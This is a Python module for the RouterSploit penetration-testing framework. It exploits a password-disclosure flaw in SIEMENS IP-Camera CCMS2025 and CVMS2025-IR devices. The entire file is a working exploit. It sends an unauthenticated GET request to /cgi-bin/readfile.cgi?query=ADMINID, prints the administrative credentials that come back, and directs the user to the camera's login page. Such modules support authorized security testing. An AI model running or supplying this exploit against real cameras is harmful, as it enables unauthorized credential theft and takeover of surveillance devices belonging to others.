from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "SIEMENS IP-Camera CCMS2025 Password Disclosure",
        "description": "Module exploits SIEMENS IP-Camera CCMS2025 Password Dislosure vulnerability. If target is vulnerable "
                       "it is possible to read administrative credentials",
        "authors": (
            "Yakir Wizman",  # vulnerability discovery
            "VegetableCat <yes-reply[at]linux.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/40254/",
        ),
        "devices": (
            "SIEMENS IP-Camera CVMS2025-IR",
            "SIEMENS IP-Camera CCMS2025",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def __init__(self):
        self.content = None

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            print_info(self.content)
            print_info("Please login at: {}".format(self.get_target_url(path="/cgi-bin/chklogin.cgi")))
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/cgi-bin/readfile.cgi?query=ADMINID"
        )

        if response and "Adm_ID" in response.text:
            self.content = response.text
            return True  # target is vulnerable

        return False  # target is not vulnerable
